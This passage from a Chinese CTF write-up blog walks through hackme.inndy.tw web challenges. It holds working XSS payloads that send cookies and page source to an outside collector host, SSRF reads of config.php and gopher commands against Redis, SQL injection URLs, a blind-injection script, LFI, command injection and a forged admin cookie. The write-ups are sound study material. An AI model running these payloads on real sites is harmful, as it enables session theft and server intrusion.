    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在此之前对xss了解只有script alert(1),遇到这几题之后深刻了解到自己对于xss的浅薄理解，并认识到XSS的巨大威力从XSS到SSRF再到Redis，特此放在与之前wp不同的地方，这里主要讲解一些这题里所包含的xss原理<br>题目地址<a href="https://hackme.inndy.tw/scoreboard/" target="_blank" rel="noopener">https://hackme.inndy.tw/scoreboard/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-xss探测"><a href="#1-xss探测" class="headerlink" title="1.xss探测"></a>1.xss探测</h3><p>先来个三步走<br><img src="https://i.imgur.com/kX1NrCI.png" alt=""><br>robots.txt中发现了个backup.zip的压缩包，下载下来发现需要压缩码，一般来说是不会让我们暴力破解的，猜测我们需要读取config.php中的内容<br><img src="https://i.imgur.com/GA43vO0.png" alt=""><br>既然题目叫xss me这里肯定需要xss的<br>经过一系列测试后发现&lt;svg/onload&gt;没有被过滤</p><blockquote><p>onload 事件</p></blockquote><p>当页面载入完毕后执行Javascript代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;myFunction()&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>以下 HTML 标签支持 onload :<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;, &lt;frame&gt;, &lt;frameset&gt;, &lt;iframe&gt;, &lt;img&gt;, &lt;input type=&quot;image&quot;&gt;, &lt;link&gt;, &lt;script&gt;, &lt;style&gt;</span><br></pre></td></tr></table></figure></p><p>并且IE/FireFOx/Chrome都支持onload事件<br>那么Svg又是什么呢？<br>明明查的时候是这么解释的</p><blockquote><p>SVG 教程 SVG 意为可缩放矢量图形（Scalable Vector Graphics）。 SVG 使用 XML 格式定义图像。 现在开始学习 SVG! SVG 实例 My first SVG 尝试一下 » 点击 “尝试..</p></blockquote><p>为什么添加了一个svg就可以执行xss脚本呢，并且里面的实体编码就有效果了呢？？<br><a href="https://www.hackersb.cn/hacker/85.html" target="_blank" rel="noopener">SVG XSS的一个黑魔法</a><br><a href="https://blog.csdn.net/qq_35513598/article/details/79861908" target="_blank" rel="noopener">深入理解浏览器解析机制及XSS向量编码</a></p><p>大概意思我精简一下，当然想要深入了解可以看,毕竟我也只是刚刚接触无法做到深入透彻的了解<br>为什么<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;后面能够支持实体编码，长话短说就是</span><br><span class="line">&lt;svg&gt;遵循XML和SVG的定义，我们知道，在XML中，&amp;#40;会被解析成（</span><br><span class="line">在XML中实体会自动转义,除了&lt;![CDATA[和]]&gt;包含的实体</span><br></pre></td></tr></table></figure></p><p>代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;xml&gt;</span><br><span class="line">    &lt;name&gt;aaa&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;aaaaaaa&amp;#40;&lt;/value&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></p><p>会被转化成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;xml&gt;</span><br><span class="line">    &lt;name&gt;aaa&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;aaaaaaa)&lt;/value&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure></p><p>好吧，回到题目<br>我们可以通过构造类似如下PAYLoad<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;javascript:document.location=&apos;http://vps_ip:23333&apos;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>这里svg/onload中间的/是为了绕过空格限制，进行实体编码，这里要将vps_ip换成自己的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;xxxxxxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在不使用js伪协议的情况下javascript:是无法使用实体编码的，当然也可以这么构造&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>js伪协议</p><blockquote><p>简单来说就是一种关联使用js伪协议伪协议后面会当成javascript来执行，现在src后面已经禁止使用js伪协议了</p></blockquote><p>具体可以看<a href="https://www.cnblogs.com/song-song/p/5277838.html" target="_blank" rel="noopener">A标签使用javascript:伪协议</a></p><p><img src="https://i.imgur.com/GbNsUaK.png" alt=""><br>这种题目，一般是要获取cookie<br>于是开始构造payload打一波cookie（当然如果是http-only是不能获取到cookie的）<br>payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>得到flag</p><h3 id="1-xssrf-leak"><a href="#1-xssrf-leak" class="headerlink" title="1.xssrf leak"></a>1.xssrf leak</h3><p>这里推荐大家一个xss接收平台</p><blockquote><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p></blockquote><p>这题很显然是要我们登入admin并且是本地登入ssrf<br>尝试使用之前admin的cookie试试登入<br>发现需要本地<br>改XFF是绕不过去的，而且这种设计XSS题一般思路都是用XSS去读源码<br>构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://ugelgr.ceye.io/?&apos;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>就是把源码以base64发给我们<br><img src="https://i.imgur.com/u0DQEHw.png" alt=""><br>现在才知道这个CTF平台是台湾科技大学的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;nav class=&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;&gt;</span><br><span class="line">  &lt;a class=&quot;navbar-brand&quot; href=&quot;index.php&quot;&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">    &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class=&quot;navbar-nav ml-auto&quot;&gt;</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;</span><br><span class="line">      &lt;span class=&quot;navbar-text&quot;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li</span><br><span class="line">    &lt;li class=&quot;nav-item&quot;&gt;</span><br><span class="line">      &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;container&quot;</span><br><span class="line"></span><br><span class="line">      &lt;div class=&quot;card text-white bg-dark&quot;</span><br><span class="line">        &lt;div class=&quot;card-body&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>发现 多了个request.php<br>我们应该要取读这个文件<br>在request.php发现可以插入xss<br><img src="https://i.imgur.com/hxt2bm1.png" alt=""><br>读取config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/GyzafPo.png" alt=""></p><blockquote><p>onreadystatechange 是一个事件句柄。它的值 (state_Change) 是一个函数的名称，当 XMLHttpRequest 对象的状态发生改变时，会触发此函数。状态从 0 (uninitialized) 到 4 (complete) 进行变化。仅在状态为 4 时，我们才执行代码。</p></blockquote><blockquote><p>我们的实例在 open() 的第三个参数中使用了 “true”。<br>该参数规定请求是否异步处理。<br>True 表示脚本会在 send() 方法之后继续执行，而不等待来自服务器的响应。<br>onreadystatechange 事件使代码复杂化了。但是这是在没有得到服务器响应的情况下，防止代码停止的最安全的方法。<br>通过把该参数设置为 “false”，可以省去额外的 onreadystatechange 代码。如果在请求失败时是否执行其余的代码无关紧要，那么可以使用这个参数。</p></blockquote><p>得到flag</p><h3 id="3-xss-redis"><a href="#3-xss-redis" class="headerlink" title="3.xss redis"></a>3.xss redis</h3><blockquote><p>Steal flag from redis<br><img src="https://i.imgur.com/JNGJ0Vc.png" alt=""></p></blockquote><p>一想到redis 就想到gopher打未授权redis，想到..开花<br>要注意的是在SSRF利用gopher协议时，命令前要加_<br>同时要进行两次URL编码(实际解码了两次，SSRF本身要解码）<br>尝试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=&quot;</span><br><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps_ip:23333/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class="line">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a_quit&quot;);</span><br><span class="line">&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/sTBSRHU.png" alt=""></p><p>确实是未授权</p><blockquote><p>Redis Info 命令以一种易于理解和阅读的格式，返回关于 Redis 服务器的各种信息和统计数值</p></blockquote><p>看下有没有KEY<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_KEYS%2520*%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><p>发现flag<br>尝试读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_get%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><p>发现报错<br>发现类型错误了<br>那我们看看类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_type%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_llen%2520flag%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>发现是个list<br>那我们看看长度</p><p>发现是53<br>读取数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure><p>拼接下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s=&apos;.....&apos;</span><br><span class="line">flag = s.replace(&apos;\n\n\n\n&apos;,&apos; &apos;)</span><br><span class="line">flag = flag.replace(&apos;$1&apos;,&apos;&apos;)</span><br><span class="line">flag = flag.replace(&apos;\n&apos;,&apos;&apos;)</span><br><span class="line">print(flag[::-1])</span><br></pre></td></tr></table></figure></p><blockquote><p>真的需要学习下redis的基本命令了</p></blockquote><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这题题目真的很好，暴露了我很多问题，比如对xss，redis认识都不够等等，同时也暴露了我对html，js的编码的不了解，接下来有时间一定要好好学习下，还有xss实在太强了</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/156377" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156377</a><br><a href="http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" target="_blank" rel="noopener">http://www.northity.com/2018/10/23/XSSme%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从xss到ssrf再到gopher打redis
    
    </summary>
    
      <category term="writeup" scheme="https://museljh.github.io/categories/writeup/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>hackme web wp</title>
    <link href="https://museljh.github.io/2019/02/14/hackme%20web%20wp/"/>
    <id>https://museljh.github.io/2019/02/14/hackme web wp/</id>
    <published>2019-02-14T12:38:07.000Z</published>
    <updated>2019-02-14T13:08:46.747Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>hack me 很不错的一个ctf平台，有些题目质量很高</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="1-捉迷藏"><a href="#1-捉迷藏" class="headerlink" title="1.捉迷藏"></a>1.捉迷藏</h3><p>直接F12 输入flag字符查找</p><h3 id="2-留言"><a href="#2-留言" class="headerlink" title="2.留言"></a>2.留言</h3><blockquote><p>提示：这本留言簿很糟糕。sqlmap是你的朋友。<br>说明可以直接使用sqlmap</p></blockquote><p><img src="https://i.imgur.com/0EE9Ldx.png" alt=""><br>这边应该是可以注入的，<br>使用’会报错，使用’#就不会报错<br>大概它的语句是select xxx from xxx where xxx=’$xx’;<br>由于页面只会显示success与false估计只能使用布尔盲注了<br>但是我’ union select 1,2,3,database()# 却会报错<br>（后来想下这估计是使用insert注入…一开始我直接想当然以为它是select）<br>原因未知，使用下sqlmap试试<br>使用sqlmap貌似不可以，可能有什么黑名单之类的过滤。<br><img src="https://i.imgur.com/ttMjVLC.png" alt=""><br>这边的id参数也是可以注入的<br>直接使用联合注入方式<br>payload<br>爆数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0%20union%20select%201,2,3,database()#</span><br></pre></td></tr></table></figure></p><p>直接查出数据库是g8<br>爆表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20TABLE_NAME%20from%20information_schema.TABLES%20where%20TABLE_SCHEMA=%27g8%27%20limit%200,1),4#</span><br></pre></td></tr></table></figure></p><p>查出表为flag<br>爆列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20COLUMN_NAME%20from%20information_schema.COLUMNS%20where%20TABLE_NAME=%27flag%27%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p><p>还是flag<br>爆flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=0%20union%20select%201,2,(select%20flag%20from%20flag%20limit%201,1),4#</span><br></pre></td></tr></table></figure></p><p>FLAG=<br>出来了</p><blockquote><p>(注：这边id=0是为了让第一个查询结果为空，不然是查询不出结果的)<br>尝试了下能不能用报错注入，不过没有错误信息所以不可以，盲注应该也是可以的我就不演示了。</p></blockquote><h3 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3.LFI"></a>3.LFI</h3><blockquote><p>这个管理员的密码是什么？这根本不重要，只要拿到旗帜。<br>提示：LFI，php://filter</p></blockquote><p><img src="https://i.imgur.com/eNHrynx.png" alt=""><br>看下源码发现hint<br>显然这是要我们读取pages/flag这个文件<br><img src="https://i.imgur.com/jAjs9HZ.png" alt=""><br>直接试试嘿嘿。<br>这个？page估计是文件读取类似于file=xxx<br>根据题目提示：hp://filter<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag</span><br></pre></td></tr></table></figure></p><p>直接爆出一段base64<br>解码获得<br>Can you read the flag&lt;?php require(‘config.php’); ?&gt;?</p><blockquote><p>php://filter/read=convert.base64-encode/resource=<br>可以将文件以base64的形式读取<br>这应该是要我们读取config文件<br>尝试下<br>爆出一段base64码<br>解码获得</p></blockquote><p>$flag = </p><h3 id="4-主页"><a href="#4-主页" class="headerlink" title="4.主页"></a>4.主页</h3><blockquote><p>国旗在哪里？你检查过代码了吗？<br>这题又是查看源码<br>但是find flag 只有第一题的flag<br>后来查了下原来这里有flag（一开始我还以为是乱码）</p></blockquote><blockquote><p><a href="https://hackme.inndy.tw/cute.js" target="_blank" rel="noopener">https://hackme.inndy.tw/cute.js</a></p></blockquote><p>可以使用aadecode进行解密</p><h3 id="5-ping"><a href="#5-ping" class="headerlink" title="5.ping"></a>5.ping</h3><blockquote><p>你能ping 127.0.0.1吗？</p></blockquote><p>进入题目发现一段源码<br><img src="https://i.imgur.com/havNdqe.png" alt=""><br>这段代码大概意思应该是输入ip且里面不能含有数组中的字段，最后会返回 ping后的内容<br>试试127.0.0.1试试<br><img src="https://i.imgur.com/jJ3nmvn.png" alt=""><br>没有得到什么有用的信息<br>那么应该就要绕过黑名单，实现命令执行<br>linux下多行命令</p><blockquote><p>在使用UNIX命令时，系统为了提高使用的灵活性，支持多种命令输入的方式。例如，当需要完成多个命令且命令执行期间不需要人工干预时，可将多个命令写在同一个命令行中，命令之间用分号（；）隔开<br>如：pwd；ls -l </p></blockquote><p>本来想这样试试的，结果貌似被过滤了，<br>试试其他方法</p><blockquote><p><a href="https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a><br><a href="https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://chybeta.github.io/2017/08/08/php%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p></blockquote><p>使用(反单引号)试试</p><blockquote><p>在php中称之为执行运算符，PHP 将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出，使用反引号运算符“`”的效果与函数 shell_exec() 相同。</p></blockquote><p><code>ls</code>后<br><img src="https://i.imgur.com/Fs02EmI.png" alt=""><br>试试其他方式,$(ls) 貌似也可以，其他的暂时没找到<br>然后构造?ip=<code>more *</code>拿到flag<br>在linux文件读取方式很多如tac，tail等等</p><h3 id="6-记分牌"><a href="#6-记分牌" class="headerlink" title="6.记分牌"></a>6.记分牌</h3><p>在header头部有flag</p><h3 id="7-以管理员身份登录0"><a href="#7-以管理员身份登录0" class="headerlink" title="7.    以管理员身份登录0"></a>7.    以管理员身份登录0</h3><blockquote><p>   提示：SQL注入！</p></blockquote><p>之间点击souce_code获取源码<br><img src="https://i.imgur.com/c9di8pW.png" alt=""><br>发现它对于‘会有转译，我们只要/’将它的转译转译就可以了<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union select 1,2,3,4#</span><br></pre></td></tr></table></figure></p><p>原先我用admin/‘ || 1=1 # 嗯它可能变成为admin<br>get flag</p><h3 id="8-以管理员身份登录0-1"><a href="#8-以管理员身份登录0-1" class="headerlink" title="8.    以管理员身份登录0.1"></a>8.    以管理员身份登录0.1</h3><p>貌似和上题一模一样，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;\&apos; UNION SELECT &quot; #&#125;, flag2 in the database!</span><br></pre></td></tr></table></figure></p><p>这么说我们要查询数据库了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,1,1,database()#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/LG5Pp85.png" alt=""></p><p>发现没有反应，这里应该是要盲注了我这么想<br>结果直接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure></p><p>发现貌似爆出的表<br>Hi, h1dden_f14g,user<br>难道数据库叫做1？？？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos; union  select 1,the_f14g,3,4 from h1dden_f14g#</span><br></pre></td></tr></table></figure></p><p>得出flag</p><h3 id="9-以管理员身份登录1"><a href="#9-以管理员身份登录1" class="headerlink" title="9.    以管理员身份登录1"></a>9.    以管理员身份登录1</h3><blockquote><p>   请以管理员身份登录。<br>提示：SQL注入但sqlmap不再工作。<br>更新：源代码现已上市。</p></blockquote><p>扫描仪无法工作<br>说明还是sql注入 但是不能直接使用sqlmap<br><img src="https://i.imgur.com/CxXwp3r.png" alt=""><br>过滤函数，<br>过滤了空格<br>空格绕过</p><blockquote><p>%09 TAB键（水平）<br>/**/<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p></blockquote><p>\‘来绕过单引号<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&apos;/**/union/**/select/**/1,2,3,4/**/#</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/Yy6j0a6.png" alt=""></p><h3 id="10-login-as-admin-1-2"><a href="#10-login-as-admin-1-2" class="headerlink" title="10.login as admin 1.2"></a>10.login as admin 1.2</h3><p>和上题貌似是一样的（吐槽下，这个ctf平台真的是利用资源阿）<br>题目提示要使用盲注<br>我们先联合注入一波试试<br><img src="https://i.imgur.com/xIpQsjD.png" alt=""><br>失败<br>看来只能盲注了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#求数据库的名字</span><br><span class="line">url = &quot;https://hackme.inndy.tw/login1/index.php&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload = &quot;\\&apos;/**/or/**/(ascii(substr((select/**/SCHEMA_NAME/**/from/**/information_schema.SCHEMATA/**/limit/**/0,1),%s,1))=%s)/**/limit/**/0,1#&quot;%(i,j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &quot;name&quot;:payload,</span><br><span class="line">            &quot;password&quot;:&quot;1&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        print payload</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        if &quot;You are not admin!&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p><p>跑到怀疑人生还是不跑了</p><h3 id="11-login-as-admin-3"><a href="#11-login-as-admin-3" class="headerlink" title="11.login as admin 3"></a>11.login as admin 3</h3><p><img src="https://i.imgur.com/xCW1UM2.png" alt=""><br>想要爆出flag，cookie中的$user[‘admin’] 要为true<br>从上往下看<br>如果没有cookie的话就继续进行<br><img src="https://i.imgur.com/p969kJx.png" alt=""><br>验证<br>但是如果有cookie的话<br>如果不满足<br><img src="https://i.imgur.com/VZUNTwq.png" alt=""><br>就会报错<br>这了我们要利用，php弱比较，构造sig=0，负负得真绕过限制<br>根据set_users构造cookie形式<br><img src="https://i.imgur.com/T8QjfBR.png" alt=""><br>{“sig”:0,”data”:”[\”admin\”,true]”}<br>进行base64加密，构造payload<br><img src="https://i.imgur.com/1y2N2Hy.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJzaWciOjAsImRhdGEiOiJbXCJhZG1pblwiLHRydWVdIn0=</span><br></pre></td></tr></table></figure><h3 id="12-login-as-admin-4"><a href="#12-login-as-admin-4" class="headerlink" title="12.login as admin 4"></a>12.login as admin 4</h3><p>看源码，这次得源码很短<br><img src="https://i.imgur.com/vhHtQqL.png" alt=""><br>需要$_POST[‘name’] === ‘admin’<br>看看前面<br><img src="https://i.imgur.com/flDWZWG.png" alt=""><br>如果我们<br>$_POST[‘name’] === ‘admin’<br>就需要$_POST[‘password’] !== $password 不然后面<br>Location: ./?failed=1 就会跳转到failed=1<br><img 